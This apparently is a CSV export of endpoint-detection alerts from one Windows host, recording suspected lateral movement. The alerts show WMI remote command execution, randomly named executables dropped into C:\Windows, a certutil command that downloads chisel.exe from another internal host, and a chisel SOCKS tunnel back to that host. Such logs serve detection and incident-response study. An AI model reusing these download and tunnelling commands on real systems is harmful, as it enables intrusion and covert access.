"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T12:21:24.684Z","10.0.3.11","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","chisel.exe  client 10.0.3.30:1080 socks","",
"2025-03-28T12:20:34.573Z","10.0.3.11","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","certutil  -urlcache -f http://10.0.3.30/chisel.exe C:\Windows\Temp\chisel.exe","@{filename=chisel[1].exe; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE; timestamp=1743164433},@{filename=chisel.exe; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743164433},@{filename=47A59140610ECB9ACB2C0C4013DB4E46; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content; timestamp=1743164432}",
"2025-03-28T12:20:34.573Z","10.0.3.11","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","certutil  -urlcache -f http://10.0.3.30/chisel.exe C:\Windows\Temp\chisel.exe","@{filename=chisel.exe; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743164433},@{filename=chisel[1].exe; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE; timestamp=1743164433},@{filename=47A59140610ECB9ACB2C0C4013DB4E46; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content; timestamp=1743164432}",
"2025-03-28T12:20:33.995Z","10.0.3.11","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","certutil  -urlcache -f http://10.0.3.30/chisel.exe C:\Windows\Temp\chisel.exe","@{filename=chisel.exe; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743164433},@{filename=chisel[1].exe; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE; timestamp=1743164433},@{filename=47A59140610ECB9ACB2C0C4013DB4E46; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content; timestamp=1743164432}",
"2025-03-28T12:20:30.901Z","10.0.3.11","High","70","Certutil was observed downloading file(s) from a remote location. This process is rarely used benignly in this context. Please review the command line and process tree.","certutil  -urlcache -f http://10.0.3.30/chisel.exe C:\Windows\Temp\chisel.exe","@{filename=chisel.exe; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743164433},@{filename=chisel[1].exe; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE; timestamp=1743164433},@{filename=47A59140610ECB9ACB2C0C4013DB4E46; filepath=\Device\HarddiskVolume1\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content; timestamp=1743164432}",
"2025-03-28T12:19:49.308Z","10.0.3.11","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","C:\Windows\rUZQqqlt.exe","",
"2025-03-28T12:19:49.308Z","10.0.3.11","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","System","@{filename=rUZQqqlt.exe; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743164389},@{filename=TKrKPqPi.exe; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743163863}",
"2025-03-28T12:11:04.508Z","10.0.3.11","Low","30","This file is classified as Adware/PUP based on its SHA256 hash.","C:\Windows\TKrKPqPi.exe","",
"2025-03-28T12:11:04.507Z","10.0.3.11","Low","30","A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.","System","@{filename=rUZQqqlt.exe; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743164389},@{filename=TKrKPqPi.exe; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743163863}",
"2025-03-28T12:06:05.421Z","10.0.3.11","High","70","A process appears to be using Windows Management Instrumentation (WMI) to suspiciously execute code. Investigate the command line and process tree.","cmd.exe /Q /c ping -n 1 10.0.3.43 1> \Windows\Temp\vfATFg 2>&1","",
